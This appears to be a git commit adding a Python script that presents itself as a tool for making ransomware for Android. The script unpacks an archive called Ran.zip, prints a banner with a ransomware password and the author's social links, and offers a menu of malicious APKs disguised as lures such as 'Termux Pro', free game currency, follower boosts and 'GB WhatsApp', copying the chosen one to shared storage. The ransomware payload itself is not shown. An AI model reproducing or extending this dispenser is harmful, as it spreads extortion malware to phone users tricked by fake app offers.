6fd488aebf613598e5440f57adab5a11e9820133
bo_haydar <139859144+bohaydar@users.noreply.github.com>
2023-08-21 00:02:41 +0300

    Add files via upload

---
+++ blackego.py
@@ -0,0 +1,63 @@
+import os
+os.system("clear")
+os.system("pkg install unzip")
+os.system("unzip Ran.zip")
+os.system("clear")
+print ( """\033[1;31m
+         .'.:Oo..                                    ..oO:.'.
+        :XMK0WKx:.            ';looool;'            .:xKW0KMXc
+       ':KNk:c,. :.       ,dKWMMMMMMMMMMWKd,       .: .,::kNK:'
+       ' :dl   ..lk'   .oXMMMMMMMMMMMMMMMMMMXo.   'kl..   cd: '
+       .'..  ...':kKd.cKxXMMMMMMMMMMMMMMMMMMXxKc.dKk:'...  ..'.
+         ..........:oxXl,0WMMMMMMMMMMMMMMMMW0,lXxo:..........
+                  ..cNOl.dXMMMMMMMMMMMMMMMMXd.lONc..
+                    0Ock..l0WMMMMMMMMMMMMW0l..OcO0
+                   .Xo.lx.;x0XWMWWMMWWMWX0x;.xl.oX.
+                   .0; ;NOdoodxkdlodlokxdoodON; ;0.
+                    l.'d.       .llll.       .d,.l
+                    '.Oc         OKKO         cO.'
+                     'kd.       'k..k'       .xk'
+                     ,;KNkdoolllx.  .xllloodkNK;,
+                     ..;codxOxoO'    'OoxOxdoc;..
+                       ,.....co0x;ll;x0oc.....,.
+                     '::;. .,,OKXXOOXXKO,,. .;;:'
+                .''cxOl;l; .:coxolddloxoc:. ;l;lOkc,'.
+         ....';lxk0Kl.''cl:.;:c:llxxll:c:;.:lc''.c0Kkxl;'...
+        cOXKKXWMMNd,'.  ,:Ox::clollllolc;;xO:,  .',dNMMWXKKXOc
+       ,xKK0x,.lNx,'    .,;00kxolccclllxxO0;,.    ',xWo.,x0KKx,
+       .;'''. ,xk,.       .;xNWWNXXXXNWWNx;.       .,xx, .''';.
+          xK..ON;'         ..,lkK0kk0Kkl,..         ';NO..Kx.
+          ox''o0l'            ..........            'l0o''xo
+             ...'                                    '...\033[1;35m
+   ______________            ______      __________              
+   ___  __ )__  /_____ _________  /__    ___  ____/______ ______ 
+   __  __  |_  /_  __ `/  ___/_  //_/    __  __/  __  __ `/  __ \ 
+   _  /_/ /_  / / /_/ // /__ _  ,<       _  /___  _  /_/ // /_/ /
+   /_____/ /_/  \__,_/ \___/ /_/|_|      /_____/  _\__, / \____/ 
+                                                  /____/
+     THE TOOL BY BO HAYDAR TO MAKE RANSOMWARE FOR ANDROID SYSTEM
+               \033[0;101m\033[1;34m Ransomware Passwrd \033[1;32m : 10203040506070 \033[0;32m
+     \033[1;31m YouTube   :\033[1;32m  https://youtube.com/@BO_HAYDAR_HK
+     \033[1;31m Telegram  :\033[1;32m  https://t.me/txrtm
+     \033[1;31m Tele Team :\033[1;32m  https://t.me/+EHo65POl1yA2ZjA0
+     \033[1;31m Gitub     :\033[1;32m  https://github.com/bohaydar
+     \033[1;36m
+    _____________________________________________________________
+   |_____________________________________________________________|
+
+  \033[1;32m    [1] \033[1;31m Termux Pro\033[1;32m   [2]\033[1;31m Play Store Pro\033[1;32m [3]\033[1;31m Insta followers
+  \033[1;32m    [4] \033[1;31m Pubg Us Free\033[1;32m [5]\033[1;31m Update System\033[1;32m  [6]\033[1;31m Tiktok followers
+  \033[1;32m    [7] \033[1;31m Telegram Plus\033[1;32m[8]\033[1;31m GB WhatsApp\033[1;32m    [9]\033[1;31m Ff dimond Free
+  \033[1;32m    [10]\033[1;31m Instgram Gold\033[1;32m[00]\033[1;31m1xbet Free\033[1;32m     [hh]\033[1;31m Yala Lodo mod
+  \033[1;36m
+    _____________________________________________________________
+   |_____________________________________________________________|
+""")
+vvvv = input('''\033[1;34m     
+
+        Enter Ransomware Number\033[1;35m ==> √  :    ''')
+if vvvv == '' :
+   os.system("python blackego.py")
+elif vvvv =='1' :
+     os.system("cd Ran && cp 'Termux_Pro.apk' /sdcard/BLACK_EGO")
+     os.system("python black.ego.py")
